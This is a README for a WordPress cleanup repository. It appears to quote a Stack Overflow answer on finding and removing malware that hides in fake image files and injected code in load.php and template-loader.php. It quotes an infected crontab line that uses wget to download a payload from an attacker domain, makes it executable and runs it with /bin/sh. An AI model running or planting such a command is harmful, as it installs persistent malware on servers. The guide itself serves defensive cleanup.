# Clean-Wordpress-Hack
This repository contains common hack issues of the wordpress 

# To clean the common .htaccess hack follow this url below 
https://stackoverflow.com/questions/67296060/hacked-wordpress-htaccess

I had the same problem and the antivirus was not able to detect it and also the problem of automatically creating files was not related to CronJobs, as friends mentioned. In fact, every time a page is opened from the site, those files are rebuilt.

I have carefully examined the issue and offer the solution.

The problem occurs for both .htaccess and index.php.

.htaccess infected file index.php infected file

First we search for a keyword in the text of the file:

# grep -lir "wjsindex.php" ./
./wp-admin/images/arrow-rights.png
./wp-includes/images/smilies/icon_crystal.gif
./.htaccess
For another file, we search for a keyword in the text:

# grep -lir "RZXiMOEbYmVH" ./
./wp-admin/images/arrow-lefts.png
./index.php
./wp-includes/images/smilies/icon_devil.gif
If you look at the contents of these found image files, you will see that they are not images and contain malicious code that exactly matched our two original files.

Sample:

sample malicious arrow-rights.png file sample malicious arrow-lefts.png file

We now search for all four files found:

# grep -lirE "arrow-rights.png|icon_crystal.gif|arrow-lefts.png|icon_devil.gif" ./
./wp-includes/load.php
./wp-includes/template-loader.php
If you edit these two results files. At the bottom of the file load.php and at the beginning of the file template-loader.php you will see the extra code that needs to be removed. (Starting with //ckIIbg)

diff wp-includes/load.php files diff wp-includes/template-loader.php files

To find out more exactly which sections are correct and which are malicious, just replace that file from another WordPress that you are sure is safe and the same version, or find and remove the extra sections with the diff command.
Thus:

# diff  ./wp-includes/load.php ~healthy/www/wp-includes/load.php
# diff  ./wp-includes/template-loader.php ~healthy/www/wp-includes/template-loader.php
And as a final step, delete the four malicious image files:

# rm -f ./wp-admin/images/arrow-rights.png ./wp-includes/images/smilies/icon_crystal.gif ./wp-admin/images/arrow-lefts.png ./wp-includes/images/smilies/icon_devil.gif
Edited:

And also check cronjobs (/var/spool/cron/username) for be like this infected line and remove it:

* * * * * wget -q -O xxxd http://hello.hahaha666.xyz/xxxd && chmod 0755 xxxd && /bin/sh xxxd /home//username/public_html 24 && rm -f xxxd
This code create a ./css/index.php file and can be deleted.

# After All still you website is regenerating index.php or htaccess 
You need to restart your server or Kill all the process that are running for your server
